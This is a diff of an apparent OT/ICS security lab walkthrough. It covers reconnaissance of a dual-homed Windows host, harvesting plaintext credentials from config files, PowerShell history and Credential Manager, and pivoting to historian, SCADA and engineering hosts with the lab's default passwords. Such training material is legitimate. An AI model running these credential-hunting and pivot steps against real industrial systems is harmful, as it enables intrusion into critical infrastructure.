@@ -5,11 +5,11 @@
 *Establish who you are and what domain you are in before moving on.*
 
 ```cmd
-whoami
-hostname
-systeminfo
-whoami /groups
-net localgroup Administrators
+PS C:\Users\bursardesk> whoami
+PS C:\Users\bursardesk> hostname
+PS C:\Users\bursardesk> systeminfo
+PS C:\Users\bursardesk> whoami /groups
+PS C:\Users\bursardesk> net localgroup Administrators
 ```
 
 `systeminfo` confirms UUPL domain membership and Windows 10 build. `whoami /groups` shows
@@ -20,35 +20,35 @@ domain membership. `net localgroup Administrators` shows bursardesk has local ad
 *The dual-homed NIC is the key finding. Establish it early.*
 
 ```cmd
-ipconfig /all
+PS C:\Users\bursardesk> ipconfig /all
 ```
 
-*Two adapters: 10.10.1.20 (enterprise) and 10.10.2.100 (operational). The second NIC is the pivot point.*
+*Two adapters: Ethernet 0 at 10.10.1.20 (enterprise) and Ethernet 1 at 10.10.2.100 (operational). Each shows a `Physical Address` field with the real hardware MAC. The second NIC is the pivot point.*
 
 ```cmd
-route print
+PS C:\Users\bursardesk> route print
 ```
 
 *The IPv4 table shows a route to 10.10.2.0/24 via 10.10.2.100. This confirms direct access to
 the operational network without going through the engineering workstation.*
 
 ```cmd
-arp -a
+PS C:\Users\bursardesk> arp -a
 ```
 
 *ARP cache bucketed by interface. Entries in the 10.10.2.x range confirm the machine has already
 talked to operational hosts.*
 
 ```cmd
-netstat
+PS C:\Users\bursardesk> netstat
 ```
 
 *Active connections. Check for established sessions to 10.10.2.10 (historian) or 10.10.2.20 (SCADA).*
 
 ```cmd
-ping 10.10.2.10
-ping 10.10.2.20
-ping 10.10.2.30
+PS C:\Users\bursardesk> ping 10.10.2.10
+PS C:\Users\bursardesk> ping 10.10.2.20
+PS C:\Users\bursardesk> ping 10.10.2.30
 ```
 
 *Historian, SCADA, and engineering workstation are all reachable via the operational NIC.*
@@ -58,30 +58,30 @@ ping 10.10.2.30
 *The Windows user profile is the primary loot surface. Start recursive.*
 
 ```cmd
-dir /s *.conf
+PS C:\Users\bursardesk> dir /s *.conf
 ```
 
 *Returns AppData\Roaming\UUPLOps\ops-access.conf: plaintext credentials for historian and SCADA.*
 
 ```cmd
-dir /s *.ps1
+PS C:\Users\bursardesk> dir /s *.ps1
 ```
 
 *Returns Desktop\pull_monthly_report.ps1: scheduled script with hard-coded historian password.*
 
 ```cmd
-dir /s *.csv
+PS C:\Users\bursardesk> dir /s *.csv
 ```
 
 *Returns reports\turbine_2024-01.csv through turbine_2024-03.csv: turbine telemetry pulled monthly
 from the historian. The timestamps and values in these files confirm the historian is live.*
 
 ```cmd
-dir Documents\
-dir Desktop\
-dir AppData\Roaming\UUPLOps\
-dir AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
-dir reports\
+PS C:\Users\bursardesk> dir Documents\
+PS C:\Users\bursardesk> dir Desktop\
+PS C:\Users\bursardesk> dir AppData\Roaming\UUPLOps\
+PS C:\Users\bursardesk> dir AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+PS C:\Users\bursardesk> dir reports\
 ```
 
 *Walk the profile manually after the recursive dump. The UUPLOps and PSReadLine directories
@@ -92,13 +92,13 @@ are the most productive.*
 ### Read the credential files directly
 
 ```cmd
-type AppData\Roaming\UUPLOps\ops-access.conf
+PS C:\Users\bursardesk> type AppData\Roaming\UUPLOps\ops-access.conf
 ```
 
 *historian / Historian2015 and admin / admin (SCADA web console). Written in 2019, never rotated.*
 
 ```cmd
-type Desktop\pull_monthly_report.ps1
+PS C:\Users\bursardesk> type Desktop\pull_monthly_report.ps1
 ```
 
 *Hard-coded $Pass = "Historian2015". The script calls /report on the historian and saves the
@@ -107,13 +107,13 @@ result to reports\turbine_YYYY-MM.csv. The reports in the profile were generated
 ### Scrape with findstr
 
 ```cmd
-findstr /i pass AppData\Roaming\UUPLOps\ops-access.conf
+PS C:\Users\bursardesk> findstr /i pass AppData\Roaming\UUPLOps\ops-access.conf
 ```
 
 *Returns all lines containing "pass": the historian and SCADA credential entries.*
 
 ```cmd
-findstr /si pass AppData\Roaming\UUPLOps\ops-access.conf
+PS C:\Users\bursardesk> findstr /si pass AppData\Roaming\UUPLOps\ops-access.conf
 ```
 
 */si combines case-insensitive with recursive subdirectory search.*
@@ -121,7 +121,7 @@ findstr /si pass AppData\Roaming\UUPLOps\ops-access.conf
 ### Windows Credential Manager
 
 ```cmd
-cmdkey /list
+PS C:\Users\bursardesk> cmdkey /list
 ```
 
 *Shows saved credentials. Expect an entry for uupl-historian (10.10.2.10), populated when
@@ -132,7 +132,7 @@ the monthly report script ran interactively.*
 *The equivalent of .bash_history. Almost always revealing.*
 
 ```cmd
-type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\bursardesk> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 The history contains:
@@ -149,19 +149,19 @@ against the exact endpoint the monthly report script calls.
 ## Scheduled tasks and processes
 
 ```cmd
-schtasks /query
+PS C:\Users\bursardesk> schtasks /query
 ```
 
 *Returns the MonthlyReport task: the scheduled pull_monthly_report.ps1 run on the 1st of each month.*
 
 ```cmd
-tasklist
+PS C:\Users\bursardesk> tasklist
 ```
 
 *Running processes. python.exe present confirms background scripts; svchost and powershell are expected.*
 
 ```cmd
-Get-PSDrive
+PS C:\Users\bursardesk> Get-PSDrive
 ```
 
 *Drive list. C: is the local profile. No mapped drives pre-configured.*
@@ -171,7 +171,7 @@ Get-PSDrive
 *Use the credentials found in the profile against real services.*
 
 ```cmd
-iwr -Uri http://10.10.2.10:8080/assets -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
+PS C:\Users\bursardesk> iwr -Uri http://10.10.2.10:8080/assets -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
 ```
 
 *Returns the historian tag list: one metric name per line (frequency_hz_x10, line_current_a,
@@ -179,25 +179,24 @@ turbine_rpm, turbine_temperature, etc.). Confirms the credential works and the h
 reachable directly from the operational NIC. The Base64 string is historian:Historian2015.*
 
 ```cmd
-iwr -Uri "http://10.10.2.10:8080/report?asset=turbine_main&from=2026-01-01&to=2026-02-01" -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
+PS C:\Users\bursardesk> iwr -Uri "http://10.10.2.10:8080/report?asset=turbine_rpm&from=<YYYY-MM>-01&to=<YYYY-MM>-28" -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
 ```
 
-*Returns CSV with headers (timestamp,value,unit) and data rows if the historian has ingested
-records for that range. This is the same query pull_monthly_report.ps1 runs.*
+*Returns CSV with headers (timestamp,value,unit) and data rows. Use the current month for
+`<YYYY-MM>`: the historian seeds 30 days of data back from startup, so recent months have
+rows. This is the same query pull_monthly_report.ps1 runs with its default `$Month` value.*
 
 ```cmd
-iwr -Uri http://10.10.2.20:8080/Scada-LTS/login.htm
+PS C:\Users\bursardesk> iwr -Uri http://10.10.2.20:8080/ -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
 ```
 
-*Returns the Scada-LTS login page HTML. Confirms the SCADA web console is reachable directly
-from 10.10.2.100 via the operational NIC. Credential is admin / admin (from ops-access.conf).
-On first boot the page may show a "System exception" message while the i18n service initialises;
-a second request or a short wait clears it.*
+*Returns the distribution-SCADA dashboard HTML. Credential is admin / admin (from
+ops-access.conf). The Base64 string is admin:admin.*
 
 ## Known hosts
 
 ```cmd
-type .ssh\known_hosts
+PS C:\Users\bursardesk> type .ssh\known_hosts
 ```
 
 *Fingerprints for 10.10.2.10 (historian), 10.10.2.20 (SCADA), and 10.10.2.30 (engineering
@@ -210,14 +209,14 @@ With a shell on 10.10.2.100, the operational network is directly reachable witho
 engineering workstation or the enterprise-to-operational firewall.
 
 ```cmd
-ssh engineer@10.10.2.30
+PS C:\Users\bursardesk> ssh engineer@10.10.2.30
 ```
 
 *Password: spanner99 (from hex-legacy-1 ENGINEER.LOG). The known_hosts entry confirms this
 connection has been made before.*
 
 ```cmd
-iwr -Uri "http://10.10.2.10:8080/report?asset=turbine_main&from=2026-01-01&to=2026-02-01" -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
+PS C:\Users\bursardesk> iwr -Uri "http://10.10.2.10:8080/report?asset=turbine_rpm&from=<YYYY-MM>-01&to=<YYYY-MM>-28" -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}
 ```
 
 *Historian data without relaying through any other machine. URL quoted to prevent the shell splitting on the `&`.*
@@ -254,15 +253,6 @@ cmdkey /list                                      saved Windows credentials
 schtasks /query                                   monthly report task
 ping 10.10.2.10                                   historian reachable via operational NIC
 iwr -Uri http://10.10.2.10:8080/assets -Headers @{Authorization="Basic aGlzdG9yaWFuOkhpc3RvcmlhbjIwMTU="}   live historian query
+iwr -Uri http://10.10.2.20:8080/ -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}               distribution-SCADA dashboard (admin:admin)
 ssh engineer@10.10.2.30                           pivot to engineering workstation (spanner99)
 ```
-
-## To investigate
-
-- `/report?asset=turbine_main` returns headers only (`timestamp,value,unit`, no rows). Historian
-  has no pre-seeded data for the 2026-01 range. Either pre-load data or pick a range matching
-  the smoke test ingest calls.
-
-- SCADA pivot: resolved. Scada-LTS deploys at `/Scada-LTS/`, not `/`. Docker DNS resolves
-  `scada-db` to the management network (unreachable after clab sets the default route); fixed
-  by pinning `10.10.2.19 scada-db` in `/etc/hosts` at entrypoint startup.
